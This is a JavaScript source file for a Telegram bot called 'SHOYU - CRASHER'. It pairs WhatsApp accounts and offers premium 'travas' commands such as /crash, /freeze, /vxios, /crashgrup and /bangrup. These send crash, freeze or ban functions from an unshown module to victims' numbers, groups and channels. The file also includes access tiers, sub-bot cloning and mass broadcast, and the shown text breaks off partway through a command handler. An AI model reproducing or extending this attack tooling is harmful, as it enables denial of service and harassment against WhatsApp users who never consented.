import { InlineKeyboard } from "grammy";
import { OWNER_USERNAME, MENU_VIDEO_URL, MAX_PAIR_PER_USER, FORCE_JOIN_CHANNEL } from "../setting/config.js";
import travas from "./travas.js";
import { log } from "./logger.js";
import {
    isOwner,
    isAdmin,
    canUseBot,
    addAdmin,
    removeAdmin,
    getAdmins,
    addPremium,
    removePremium,
    getPremiums,
    setMode,
    getPairsForUser,
    addPairNumber,
    getAllPairs,
    removePairNumber,
    clearAllPairs,
    getUsers,
    addUser,
    getBotsForUser,
    addBotEntry,
    removeBotEntry
} from "../database.js";
import {
    initWhatsappForNumber,
    endWhatsappForNumber,
    clearAllSessions,
    getClient,
    waClients,
    clientKey,
    waitForPairSuccess as waitUntilOpen,
    sharedSessionKeyFromToken
} from "./whatsapp.js";

const pendingAction = new Map();

// ----------------------------- ( REGISTER BOT HANDLERS ) ----------------------------- \\
/* Dipanggil sekali per instance bot (bot utama ATAU sub-bot hasil /addbot).
   - opts.isSubBot      -> true kalau ini bot hasil clone, matiin fitur addbot/listbot/delbot/bc
   - opts.subBotOwnerId -> uid yang dianggap "owner" khusus buat sub-bot ini
   - opts.subBotToken   -> token bot Telegram untuk sub-bot */

export function registerBotHandlers(bot, opts = {}) {
    const isSubBot = !!opts.isSubBot;
    const subBotOwnerId = opts.subBotOwnerId ? String(opts.subBotOwnerId) : null;
    const subBotToken = opts.subBotToken || null;

    // Owner check: sub-bot pake id_owner yang dikasih pas /addbot, bot utama pake OWNER_ID dari .env
    const checkOwner = (uid) => (isSubBot ? String(uid) === subBotOwnerId : isOwner(uid));

    // Key penyimpanan session WA. Bot utama: per-uid asli (privat per orang).
    // Sub-bot: SATU key sama buat semua orang yang make bot itu (session shared),
    // diturunkan dari bot ID Telegram-nya sendiri biar antar sub-bot gak nyampur.
    const sharedKey = isSubBot && subBotToken ? sharedSessionKeyFromToken(subBotToken) : null;
    const getSessionKey = (uid) => (isSubBot && sharedKey ? sharedKey : uid);

    // ----------------------------- ( HELPER: BOT REPLY ) ----------------------------- \\
    /* Mengirim pesan rich message dengan format tabel.
       - title   : judul tabel
       - rows    : array 2D [ [label, value], ... ]
       - keyboard: inline keyboard opsional */

    async function botReply(ctx, title, rows, keyboard = null) {
        const cells = [
            [
                { text: "Status", is_header: true, align: "center", valign: "middle" },
                { text: "Detail", is_header: true, align: "center", valign: "middle" }
            ],
            ...rows.map(([label, value]) => [
                { text: String(label), align: "left", valign: "middle" },
                { text: String(value), align: "left", valign: "middle" }
            ])
        ];

        const payload = {
            chat_id: ctx.chat.id,
            rich_message: {
                blocks: [
                    { type: "heading", text: title, size: 1 },
                    { type: "table", cells, is_bordered: true, is_striped: true }
                ]
            }
        };

        if (keyboard) payload.reply_markup = keyboard;

        return bot.api.raw.sendRichMessage(payload);
    }

    // ----------------------------- ( HELPER: BOT ERROR ) ----------------------------- \\
    /* Mengirim pesan error dengan format tabel. */

    function botError(ctx, reason, title = "⚠️ ACCESS WARNING\n") {
        return botReply(ctx, title, [
            ["Access", "❌ Ditolak"],
            ["Reason", reason]
        ]);
    }

    // ----------------------------- ( HELPER: BOT SUCCESS ) ----------------------------- \\
    /* Mengirim pesan sukses dengan format tabel. */

    function botSucces(ctx, detail, title = "🟢 STATUS SUCCESS\n") {
        return botReply(ctx, title, [
            ["Status", "✅ Berhasil"],
            ["Detail", detail]
        ]);
    }

    // ----------------------------- ( HELPER: BOT LIST ) ----------------------------- \\
    /* Mengirim daftar item dengan format tabel. */

    function botList(ctx, title, items, emptyText = "Kosong") {
        if (!items.length) {
            return botReply(ctx, title, [["Total", emptyText]]);
        }
        return botReply(ctx, title, items.map((item, i) => [`#${i + 1}`, item]));
    }

    // ----------------------------- ( HELPER: SEND TEXT RESULT ) ----------------------------- \\
    /* Mengirim hasil eksekusi travas. */

    async function sendTextResult(ctx, data) {
        if (data.type === "single") {
            return botReply(ctx, "🟢 Status Results\n", [
                ["Message", "✅ Berhasil terkirim"],
                ["Session", data.session],
                ["Target", data.target]
            ]);
        }

        if (data.type === "all") {
            const rows = data.results.map((item) => {
                const split = item.split(" — ");
                return [split[0], split[1] || "-"];
            });
            return botReply(ctx, "🟢 Status Results", rows);
        }
    }

    // ----------------------------- ( HELPER: TRAVAS RUN ) ----------------------------- \\
    /* Eksekusi fungsi travas ke target (user/group/channel).
       - type: "user" / "group" / "channel"
       - func: fungsi travas yang akan dijalankan */

    async function travasRun(ctx, uid, args, command, type, func) {
        let target;

        if (type === "user") {
            const number = (args[0] || "").replace(/[^0-9]/g, "");
            if (!number) return botError(ctx, `Format: /${command} <nomor>`, "⚠️ FORMAT SALAH");
            target = `${number}@s.whatsapp.net`;
        } else if (type === "group") {
            const link = args[0];
            if (!link) return botError(ctx, `Format: /${command} <link grup>`, "⚠️ FORMAT SALAH");

            const sessionKey = getSessionKey(uid);
            const sessions = getPairsForUser(sessionKey);
            const active = sessions.find(num => getClient(sessionKey, num)?.status === "open");

            if (!active) return botError(ctx, "Tidak ada sender aktif.", "⚠️ OFFLINE");

            const sock = getClient(sessionKey, active).sock;

            try {
                const invite = link.split("chat.whatsapp.com/")[1];
                if (!invite) return botError(ctx, "Link grup tidak valid.", "⚠️ ERROR");
                const metadata = await sock.groupMetadataFromInvite(invite);
                target = metadata.id;
            } catch (err) {
                return botError(ctx, err.message, "❌ GAGAL");
            }
        } else if (type === "channel") {
            const channelId = (args[0] || "").replace(/[^0-9]/g, "");
            if (!channelId) return botError(ctx, `Format: /${command} <channel_id>`, "⚠️ FORMAT SALAH");
            target = `${channelId}@newsletter`;
        }

        await actionSession(
            ctx,
            uid,
            getSessionKey(uid),
            target,
            async (sock, target) => {
                 (async () => { 
                await func(sock, target);
                })().catch(err => log.error(err));
            },
            sendTextResult
        );
    }

    // ----------------------------- ( MENU: SEND START MENU ) ----------------------------- \\
    /* Menampilkan menu utama bot. */

    async function sendStartMenu(ctx) {
        const keyboard = {
            inline_keyboard: [
                [
                    { text: "𝖺𝗅𝗅 - 𝗆𝖾𝗇𝗎", callback_data: "all_menu", style: "success" },
                    { text: "𝗍𝗋𝖺𝗏𝖺𝗌 - 𝗆𝖾𝗇𝗎", callback_data: "travas_menu", style: "success" }
                ],
                [
                    { text: "𝗈𝗐𝗇𝖾𝗋 𝖼𝗈𝗇𝗍𝖺𝖼𝗍", url: "https://t.me/" + (OWNER_USERNAME || "telegram"), style: "success" }
                ]
            ]
        };

        await bot.api.raw.sendRichMessage({
            chat_id: ctx.chat.id,
            rich_message: {
                blocks: [
                    { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
                    { type: "heading", text: "✨ SHOYU - CRASHER\n", size: 1 },
                    {
                        type: "paragraph",
                        text: [
                            "𝖧𝖺𝗅𝗈𝗈 ",
                            { type: "bold", text: ctx.from.first_name },
                            " 👋\n",
                            "𝖡𝗈𝗍 𝗌𝗁𝗈𝗒𝗎 𝖺𝖽𝖺𝗅𝖺𝗁 𝖻𝗈𝗍 𝗉𝖺𝗂𝗋𝗂𝗇𝗁 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉 𝖬𝗎𝗅𝗍𝗂-𝖲𝖾𝗌𝗌𝗂𝗈𝗇, 𝗆𝗎𝖽𝖺𝗁 𝖽𝗂𝗄𝖾𝗅𝗈𝗅𝖺, 𝖱𝖾𝗌𝗉𝗈𝗇𝗌𝗂𝖿, 𝗌𝖾𝗋𝗍𝖺 𝗆𝖾𝗆𝗂𝗅𝗂𝗄𝗂 𝗆𝖾𝗇𝗎 𝗆𝖾𝗇𝖺𝗋𝗂𝗄..\n"
                        ]
                    },
                    { type: "heading", text: "🍃 Bot Information", size: 2 },
                    {
                        type: "table",
                        cells: [
                            [
                                { text: "𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", is_header: true, align: "center", valign: "middle" },
                                { text: "𝖣𝖾𝗍𝖺𝗂𝗅𝗌", is_header: true, align: "center", valign: "middle" }
                            ],
                            [{ text: "𝖢𝗋𝖾𝖺𝗍𝗈𝗋" }, { text: "@gratler" }],
                            [{ text: "𝖵𝖾𝗋𝗌𝗂𝗈𝗇" }, { text: "13.0" }],
                            [{ text: "𝖯𝗋𝖾𝖿𝗂𝗑" }, { text: "/" }],
                            [{ text: "𝖥𝗋𝖺𝗆𝖾𝗐𝗈𝗋𝗄" }, { text: "Node.js + Baileys" }],
                            [{ text: "𝖳𝗂𝗉𝖾" }, { text: isSubBot ? "Sub-Bot (Clone)" : "Main Bot" }],
                            [{ text: "𝖲𝗍𝖺𝗍𝗎𝗌" }, { text: "Online 🟢" }]
                        ],
                        is_bordered: true,
                        is_striped: true
                    }
                ]
            },
            reply_markup: keyboard
        });
    }

    // ----------------------------- ( MENU: SEND TRAVAS MENU ) ----------------------------- \\
    /* Menampilkan menu khusus travas dengan daftar command, info, risiko. */

    async function sendTravasMenu(ctx) {
        const keyboard = {
            inline_keyboard: [
                [
                    {
                        text: "𝖻𝖺𝖼𝗄 - 𝗆𝖾𝗇𝗎",
                        callback_data: "back_menu",
                        style: "danger"
                    }
                ]
            ]
        };

        const gap = {
            type: "paragraph",
            text: [" "]
        };

        const makeTable = (headers, rows) => ({
            type: "table",
            cells: [
                headers.map(text => ({
                    text,
                    is_header: true,
                    align: "center",
                    valign: "middle"
                })),
                ...rows.map(row =>
                    row.map(text => ({
                        text
                    }))
                )
            ],
            is_bordered: true,
            is_striped: true
        });

        const blocks = [
            {
                type: "video",
                video: {
                    type: "video",
                    media: MENU_VIDEO_URL
                }
            },
            {
                type: "heading",
                text: "🦠 Travas WhatsApp Menu",
                size: 1
            },
            {
                type: "paragraph",
                text: [
                    "Halo ",
                    { type: "bold", text: ctx.from.first_name },
                    " 👋\n",
                    "Travas is a WhatsApp management feature menu.\n",
                    "Select the available command below."
                ]
            },
            gap,
            {
                type: "heading",
                text: "⚠️ Risk Information",
                size: 4
            },
            makeTable(
                [
                    "Risk",
                    "Status",
                    "Information"
                ],
                [
                    [
                        "🟢 LOW",
                        "Safe",
                        "Lower limitation possibility"
                    ],
                    [
                        "🟡 MEDIUM",
                        "Normal",
                        "Use with normal limits"
                    ],
                    [
                        "🔴 HIGH",
                        "Warning",
                        "Higher limitation possibility"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "📱 Android Travas",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/delay",
                        "Android delay system",
                        "🟢 Low"
                    ],
                    [
                        "/crash",
                        "Android system message",
                        "🟡 Medium"
                    ],
                    [
                        "/freeze",
                        "Freeze Android message",
                        "🔴 High"
                    ],
                    [
                        "/UI",
                        "Android UI message system",
                        "🔴 High"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "🍎 iPhone Travas",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/vxios",
                        "Crash IOS message system",
                        "🔴 High"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "👥 Group - Travas",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/crashgrup",
                        "Crash WhatsApp group feature",
                        "🟡 Medium"
                    ],
                    [
                        "/bangrup",
                        "Ban WhatsApp group feature",
                        "🔴 High"
                    ]
                ]
            ),
            gap,
            {
                type: "heading",
                text: "📢 Channel - Travas",
                size: 2
            },
            makeTable(
                [
                    "Command",
                    "Info",
                    "Risk"
                ],
                [
                    [
                        "/channel",
                        "Crash WhatsApp channel feature",
                        "🟢 Low"
                    ]
                ]
            )
        ];

        await bot.api.raw.sendRichMessage({
            chat_id: ctx.chat.id,
            rich_message: {
                blocks
            },
            reply_markup: keyboard
        });
    }

    // ----------------------------- ( MENU: SEND ALL MENU ) ----------------------------- \\
    /* Menampilkan semua command yang tersedia. */

    async function sendAllMenu(ctx) {
        const keyboard = {
            inline_keyboard: [
                [{ text: "𝖻𝖺𝖼𝗄 - 𝗆𝖾𝗇𝗎", callback_data: "back_menu", style: "danger" }],
                [{ text: "𝗈𝗐𝗇𝖾𝗋 𝖼𝗈𝗇𝗍𝖺𝖼𝗍", url: "https://t.me/" + (OWNER_USERNAME || "telegram"), style: "success" }]
            ]
        };

        const menuGroup = [
            {
                title: "⚙️ System - Menu",
                data: [
                    ["/mode", "Bot mode", "Owner"],
                    ["/start", "Menu utama", "All"],
                    ["/menu", "Semua command", "All"]
                ]
            },
            {
                title: "📱 Pairing - Menu",
                data: [
                    ["/pair", "Pair WhatsApp", "Premium"],
                    ["/delpair", "Hapus session", "Premium"],
                    ["/listpair", "List sender", "User"],
                    ["/clearpair", "Clear semua", "Owner"]
                ]
            },
            {
                title: "🦠 Travas - Menu",
                data: [
                    ["/freeze", "Kirim pesan android", "Premium"],
                    ["/delay", "Kirim dengan delay", "Premium"],
                    ["/ios", "Kirim khusus iOS", "Premium"],
                    ["/grup", "Kirim ke grup", "Premium"]
                ]
            },
            {
                title: "🍃 Premium - Menu",
                data: [
                    ["/addprem", "Tambah premium", "Admin"],
                    ["/delprem", "Hapus premium", "Admin"],
                    ["/listprem", "List premium", "Admin"]
                ]
            },
            {
                title: "🪐 Admin - Menu",
                data: [
                    ["/addadmin", "Tambah admin", "Owner"],
                    ["/deladmin", "Hapus admin", "Owner"],
                    ["/listadmin", "List admin", "Owner"]
                ]
            }
        ];

        // Menu addbot/delbot/listbot/broadcast cuma nongol di bot utama
        if (!isSubBot) {
            menuGroup.splice(1, 0, {
                title: "🛰️ Deploy - Menu",
                data: [
                    ["/addbot", "Deploy bot baru", "Premium"],
                    ["/delbot", "Hapus bot", "Premium"],
                    ["/listbot", "List bot milikku", "Premium"],
                    ["/bc", "Broadcast", "Admin"]
                ]
            });
        }

        const blocks = [
            { type: "video", video: { type: "video", media: MENU_VIDEO_URL } },
            { type: "heading", text: "✨ ALL MENU BOT COMAND\n", size: 1 }
        ];

        for (const group of menuGroup) {
            blocks.push({ type: "heading", text: group.title, size: 2 });

            const cells = [
                [
                    { text: "Command", is_header: true, align: "center", valign: "middle" },
                    { text: "Info", is_header: true, align: "center", valign: "middle" },
                    { text: "Access", is_header: true, align: "center", valign: "middle" }
                ]
            ];

            group.data.forEach((item) => {
                cells.push([
                    { text: item[0], align: "left", valign: "middle" },
                    { text: item[1], align: "left", valign: "middle" },
                    { text: item[2], align: "left", valign: "middle" }
                ]);
            });

            blocks.push({ type: "table", cells, is_bordered: true, is_striped: true });
            blocks.push({ type: "paragraph", text: "\n" });
        }

        await bot.api.raw.sendRichMessage({
            chat_id: ctx.chat.id,
            rich_message: { blocks },
            reply_markup: keyboard
        });
    }

    // ----------------------------- ( HELPER: SEND SX TABLE ) ----------------------------- \\
    /* Mengirim tabel generik. */

    async function sendSXTable(ctx, title, cells) {
        return bot.api.raw.sendRichMessage({
            chat_id: ctx.chat.id,
            rich_message: {
                blocks: [
                    { type: "heading", text: title, size: 1 },
                    { type: "table", cells, is_bordered: true, is_striped: true }
                ]
            }
        });
    }

    // ----------------------------- ( ACTION SESSION ) ----------------------------- \\
    /* Eksekusi fungsi dengan session WhatsApp.
       - realUid     -> uid Telegram ASLI, untuk pendingAction agar user tidak bentrok
       - storageKey  -> key session (uid utama / shared key sub-bot)
       - target      -> target pengiriman (nomor/grup/channel)
       - func        -> fungsi yang akan dijalankan
       - resultFunc  -> fungsi untuk menampilkan hasil */

    async function actionSession(ctx, realUid, storageKey, target, func, resultFunc) {
        const sessions = getPairsForUser(storageKey);

        if (!sessions.length) {
            return botError(ctx, "Belum ada sender.", "⚠️ NO SESSION");
        }

        // SINGLE SENDER
        if (sessions.length === 1) {
            const number = sessions[0];
            const client = getClient(storageKey, number);

            if (!client?.sock || client.status !== "open") {
                return botError(ctx, `Session ${number} tidak aktif.`, "⚠️ SESSION OFFLINE");
            }

            try {
                await func(client.sock, target);
                return resultFunc(ctx, { type: "single", session: number, target });
            } catch (err) {
                return botError(ctx, err.message, "❌ GAGAL EKSEKUSI");
            }
        }

        // MULTI SENDER
        pendingAction.set(realUid, { func, resultFunc, target, storageKey });

        const keyboard = { inline_keyboard: [] };
        const cells = [
            [
                { text: "Status", is_header: true, align: "center", valign: "middle" },
                { text: "Sender", is_header: true, align: "center", valign: "middle" }
            ]
        ];

        sessions.forEach((num) => {
            const client = getClient(storageKey, num);
            const status = client?.sock && client.status === "open" ? "🟢 Online" : "🔴 Offline";

            cells.push([
                { text: status, align: "center", valign: "middle" },
                { text: num, align: "left", valign: "middle" }
            ]);

            keyboard.inline_keyboard.push([
                { text: `📱 ${num}`, callback_data: `action_${num}`, style: "success" }
            ]);
        });

        keyboard.inline_keyboard.push([
            { text: "📤 Semua Sender", callback_data: "action_all", style: "primary" }
        ]);

        return bot.api.raw.sendRichMessage({
            chat_id: ctx.chat.id,
            rich_message: {
                blocks: [
                    { type: "heading", text: "📱 SELECT SENDER", size: 1 },
                    { type: "text", text: "Pilih session WhatsApp yang ingin digunakan." },
                    { type: "table", cells, is_bordered: true, is_striped: true }
                ]
            },
            reply_markup: keyboard
        });
    }

    // ----------------------------- ( FORCE JOIN CHANNEL ) ----------------------------- \\
    /* Mengecek apakah user sudah join channel wajib. */

    async function isUserJoinedChannel(uid) {
        if (!FORCE_JOIN_CHANNEL) return true;
        try {
            const member = await bot.api.getChatMember(FORCE_JOIN_CHANNEL, uid);
            return ["member", "administrator", "creator"].includes(member.status);
        } catch {
            return false;
        }
    }

    function joinChannelKeyboard() {
        return new InlineKeyboard()
            .url("📢 Join Channel", `https://t.me/${FORCE_JOIN_CHANNEL.replace("@", "")}`)
            .row()
            .text("✅ Saya Sudah Join", "recheck_join");
    }

    // ----------------------------- ( COMMAND HANDLER ) ----------------------------- \\
    /* Handler untuk semua command yang masuk. */

    bot.on("message:text", async (ctx) => {
        const text = ctx.message.text.trim();
        if (!text.startsWith("/")) return;

        const [cmdRaw, ...args] = text.split(/\s+/);
        const command = cmdRaw.slice(1).toLowerCase();
        const uid = String(ctx.from.id);

        if (!isSubBot) addUser(uid);

        if (!isSubBot && !checkOwner(uid)) {
            const joined = await isUserJoinedChannel(uid);
            if (!joined) {
                await botReply(
                    ctx,
                    "⚠️ ACCESS WARNING\n",
                    [
                        ["Access", "❌ Ditolak"],
                        ["Reason", "Wajib join channel terlebih dahulu"],
                        ["Action", "Join channel lalu coba lagi"]
                    ],
                    joinChannelKeyboard()
                );
                return;
            }
        }

        switch (command) {
            // ----------------------------- ( MENU UTAMA ) ----------------------------- \\
            case "start": {
                await sendStartMenu(ctx);
                break;
            }

            // ----------------------------- ( PREMIUM MANAGEMENT ) ----------------------------- \\
            case "addprem": {
                if (!isAdmin(uid)) return botError(ctx, "Khusus admin/owner.");
                const target = args[0];
                if (!target) return botError(ctx, "Format: /addprem <userid>", "⚠️ FORMAT SALAH");
                addPremium(target);
                await botSucces(ctx, `${target} ditambahkan jadi premium.`);
                break;
            }

            case "delprem": {
                if (!isAdmin(uid)) return botError(ctx, "Khusus admin/owner.");
                const target = args[0];
                if (!target) return botError(ctx, "Format: /delprem <userid>", "⚠️ FORMAT SALAH");
                removePremium(target);
                await botSucces(ctx, `${target} dihapus dari premium.`);
                break;
            }

            case "listprem": {
                if (!isAdmin(uid)) return botError(ctx, "Khusus admin/owner.");
                await botList(ctx, "👑 SHOYU BOT PREMIUM LIST", getPremiums(), "Belum ada user premium.");
                break;
            }

            // ----------------------------- ( ADMIN MANAGEMENT ) ----------------------------- \\
            case "addadmin": {
                if (!checkOwner(uid)) return botError(ctx, "Khusus owner.");
                const target = args[0];
                if (!target) return botError(ctx, "Format: /addadmin <userid>", "⚠️ FORMAT SALAH");
                addAdmin(target);
                await botSucces(ctx, `${target} ditambahkan jadi admin.`);
                break;
            }

            case "deladmin": {
                if (!checkOwner(uid)) return botError(ctx, "Khusus owner.");
                const target = args[0];
                if (!target) return botError(ctx, "Format: /deladmin <userid>", "⚠️ FORMAT SALAH");
                removeAdmin(target);
                await botSucces(ctx, `${target} dihapus dari admin.`);
                break;
            }

            case "listadmin": {
                if (!checkOwner(uid)) return botError(ctx, "Khusus owner.");
                await botList(ctx, "🛡️ SHOYU BOT ADMIN LIST", getAdmins(), "Belum ada admin.");
                break;
            }

            // ----------------------------- ( MODE BOT ) ----------------------------- \\
            case "mode": {
                if (!checkOwner(uid)) return botError(ctx, "Khusus owner.");
                const target = (args[0] || "").toLowerCase();
                if (!["privat", "private", "public"].includes(target)) {
                    return botError(ctx, "Format: /mode <privat/public>", "⚠️ FORMAT SALAH");
                }
                const mode = target.startsWith("privat") || target === "private" ? "private" : "public";
                setMode(mode);
                await botSucces(ctx, `Mode bot diubah ke ${mode}.`);
                break;
            }

            // ----------------------------- ( BROADCAST ) ----------------------------- \\
            case "bc": {
                if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");
                if (!isAdmin(uid)) return botError(ctx, "Khusus admin/owner.");

                const users = getUsers();
                if (!users.length) return botError(ctx, "Belum ada user yang tercatat.", "⚠️ EMPTY");

                const replied = ctx.message.reply_to_message;
                const textArg = args.join(" ");

                if (!replied && !textArg) {
                    return botError(ctx, "/bc <text>  atau  reply ke pesan/media lalu ketik /bc", "⚠️ FORMAT SALAH");
                }

                const wait = await botReply(ctx, "📤 BROADCASTING", [["Progress", `Mengirim ke ${users.length} user...`]]);

                let success = 0;
                let failed = 0;
          (async () => {
                for (const targetId of users) {
                    try {
                        if (replied) {
                            await ctx.api.copyMessage(targetId, ctx.chat.id, replied.message_id);
                        } else {
                            await ctx.api.sendMessage(targetId, textArg);
                        }
                        success++;
                    } catch {
                        failed++;
                    }
                    await new Promise((r) => setTimeout(r, 100));
                }
                                     })().catch(err => log.error(err));

                await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                await botReply(ctx, "✅ BROADCAST SELESAI", [
                    ["Berhasil", `🟢 ${success}`],
                    ["Gagal", `🔴 ${failed}`]
                ]);
                break;
            }

            // ----------------------------- ( DEPLOY BOT BARU ) ----------------------------- \\
            case "addbot": {
                if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");

                const raw = args.join(" ");
                const [token, ownerId] = raw.split(",").map((s) => s?.trim());

                if (!token || !ownerId) {
                    return botError(ctx, "Format: /addbot <token>,<id_owner>", "⚠️ FORMAT SALAH");
                }

                const { startDeployedBot } = await import("./deploy.js");

                const added = addBotEntry(uid, token, ownerId);
                if (!added) return botError(ctx, "Token ini sudah pernah kamu deploy.");

                const wait = await botReply(ctx, "⏳ DEPLOYING", [["Status", "Mengaktifkan bot baru..."]]);

                try {
                    await startDeployedBot(token, ownerId, uid);
                    await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                    await botSucces(ctx, `Bot berhasil dideploy dengan owner ID ${ownerId}.`, "✅ BOT DEPLOYED");
                } catch (err) {
                    removeBotEntry(uid, token);
                    await ctx.api.deleteMessage(ctx.chat.id, wait.message_id).catch(() => {});
                    await botError(ctx, err.message || "Token tidak valid.", "❌ DEPLOY GAGAL");
                }
                break;
            }

            // ----------------------------- ( HAPUS BOT ) ----------------------------- \\
            case "delbot": {
                if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");

                const token = args[0];
                if (!token) return botError(ctx, "Format: /delbot <token>", "⚠️ FORMAT SALAH");

                const myBots = getBotsForUser(uid);
                if (!myBots.some((b) => b.token === token)) {
                    return botError(ctx, "Token ini bukan milikmu / tidak ditemukan.");
                }

                const { stopDeployedBot } = await import("./deploy.js");
                await stopDeployedBot(token);
                removeBotEntry(uid, token);

                await botSucces(ctx, "Bot berhasil dihentikan dan dihapus.");
                break;
            }

            // ----------------------------- ( LIST BOT MILIK SENDIRI ) ----------------------------- \\
            case "listbot": {
                if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");

                const myBots = getBotsForUser(uid);
                if (!myBots.length) return botError(ctx, "Kamu belum deploy bot apapun.", "⚠️ EMPTY");

                const { deployedBots } = await import("./deploy.js");

                const cells = [
                    [
                        { text: "Token", is_header: true, align: "center", valign: "middle" },
                        { text: "Owner ID", is_header: true, align: "center", valign: "middle" },
                        { text: "Status", is_header: true, align: "center", valign: "middle" }
                    ]
                ];

                myBots.forEach((b) => {
                    const masked = `${b.token.slice(0, 8)}...${b.token.slice(-4)}`;
                    const status = deployedBots.has(b.token) ? "🟢 Online" : "🔴 Offline";
                    cells.push([
                        { text: masked, align: "left", valign: "middle" },
                        { text: b.ownerId, align: "left", valign: "middle" },
                        { text: status, align: "left", valign: "middle" }
                    ]);
                });

                await sendSXTable(ctx, "🤖 SHOYU BOT — MY DEPLOYED BOTS", cells);
                break;
            }

            // ----------------------------- ( PAIR WHATSAPP ) ----------------------------- \\
case "pair": {
    if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");

    const sessionKey = getSessionKey(uid);
    const notifyTarget = isSubBot ? subBotOwnerId : uid;

    const number = (args[0] || "").replace(/[^0-9]/g, "");
    if (!number) return botError(ctx, "Format: /pair <628xxxxxxxx>", "⚠️ FORMAT SALAH");

    const current = getPairsForUser(sessionKey);
    if (current.includes(number)) return botError(ctx, "Nomor sudah terpasang.");
    if (current.length >= MAX_PAIR_PER_USER) return botError(ctx, `Maksimal ${MAX_PAIR_PER_USER} nomor.`);

    botReply(ctx, "⏳ PROCESSING", [
        ["Status", "Membuat pairing code..."]
    ]);

    (async () => {
        try {
            const sock = await initWhatsappForNumber(
                bot,
                sessionKey,
                number,
                0,
                notifyTarget
            );

            const client = waClients.get(clientKey(sessionKey, number));
            if (client) client.isPairing = true;

            await new Promise(r => setTimeout(r, 3000));

            const code = await sock.requestPairingCode(number);

            await botReply(ctx, "🔐 SHOYU BOT PAIRING", [
                ["𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽", number],
                ["𝗣𝗮𝗶𝗿 𝗖𝗼𝗱𝗲", code],
                ["𝖠𝖼𝘁𝗂𝗈𝗇", "Masukkan kode di WhatsApp"],
                ...(isSubBot 
                    ? [["𝗧𝗶𝗽𝗲", "Shared — bisa dipakai semua user premium bot ini"]] 
                    : [])
            ]);

            const connected = await waitUntilOpen(
                sessionKey,
                number,
                90000
            );

            if (!connected) {
                throw new Error("Timeout menunggu koneksi WhatsApp.");
            }

            addPairNumber(sessionKey, number);

            await botSucces(
                ctx,
                `Nomor ${number} berhasil terhubung.`,
                "✅ PAIRING SUCCESS"
            );

        } catch (err) {
            log.error(err);

            await botError(
                ctx,
                err.message,
                "❌ PAIR GAGAL"
            );
        }
    })().catch(err => log.error(err));

    break;
}

            // ----------------------------- ( HAPUS PAIR ) ----------------------------- \\
            case "delpair": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");

                const sessionKey = getSessionKey(uid);
                const number = (args[0] || "").replace(/[^0-9]/g, "");
                if (!number) return botError(ctx, "Format: /delpair <nomor>", "⚠️ FORMAT SALAH");

                const current = getPairsForUser(sessionKey);
                if (!current.includes(number)) {
                    return botError(ctx, isSubBot ? "Nomor ini tidak ada di session bot ini." : "Nomor ini tidak terpasang di akunmu.");
                }

                await endWhatsappForNumber(sessionKey, number);
                removePairNumber(sessionKey, number);
                await botSucces(ctx, `Sesi WhatsApp ${number} dihapus.`);
                break;
            }

            // ----------------------------- ( LIST PAIR ) ----------------------------- \\
            case "listpair": {
                if (!canUseBot(uid)) return botError(ctx, "Kamu tidak punya akses.");

                // Sub-bot: session SHARED, tampilkan nomor + status
                if (isSubBot) {
                    const sessionKey = getSessionKey(uid);
                    const numbers = getPairsForUser(sessionKey);
                    if (!numbers.length) return botError(ctx, "Belum ada nomor terpasang di bot ini.", "⚠️ EMPTY");

                    const cells = [
                        [
                            { text: "Nomor", is_header: true, align: "center", valign: "middle" },
                            { text: "Status", is_header: true, align: "center", valign: "middle" }
                        ]
                    ];

                    for (const number of numbers) {
                        const client = getClient(sessionKey, number);
                        cells.push([
                            { text: number, align: "left", valign: "middle" },
                            { text: client?.status === "open" ? "🟢 Online" : "🔴 Offline", align: "left", valign: "middle" }
                        ]);
                    }

                    await sendSXTable(ctx, "📱 SHARED SESSION — SEMUA USER BOT INI", cells);
                    break;
                }

                // Bot utama: per-uid, owner bisa lihat semua
                const cells = [
                    [
                        { text: "User ID", is_header: true, align: "center", valign: "middle" },
                        { text: "Nomor", is_header: true, align: "center", valign: "middle" },
                        { text: "Status", is_header: true, align: "center", valign: "middle" }
                    ]
                ];

                if (checkOwner(uid)) {
                    for (const [userId, numbers] of Object.entries(getAllPairs())) {
                        for (const number of numbers) {
                            const client = getClient(userId, number);
                            cells.push([
                                { text: userId, align: "left", valign: "middle" },
                                { text: number, align: "left", valign: "middle" },
                                { text: client?.status === "open" ? "🟢 Online" : "🔴 Offline", align: "left", valign: "middle" }
                            ]);
                        }
                    }
                } else {
                    const numbers = getPairsForUser(uid);
                    if (!numbers.length) return botError(ctx, "Belum ada nomor terpasang.", "⚠️ EMPTY");

                    for (const number of numbers) {
                        const client = getClient(uid, number);
                        cells.push([
                            { text: uid, align: "left", valign: "middle" },
                            { text: number, align: "left", valign: "middle" },
                            { text: client?.status === "open" ? "🟢 Online" : "🔴 Offline", align: "left", valign: "middle" }
                        ]);
                    }
                }

                await sendSXTable(ctx, "📱 SHOYU BOT PAIR LIST", cells);
                break;
            }

            // ----------------------------- ( CLEAR SEMUA PAIR ) ----------------------------- \\
            case "clearpair": {
                if (isSubBot) return botError(ctx, "Fitur ini cuma tersedia di bot utama.", "⚠️ NOT AVAILABLE");
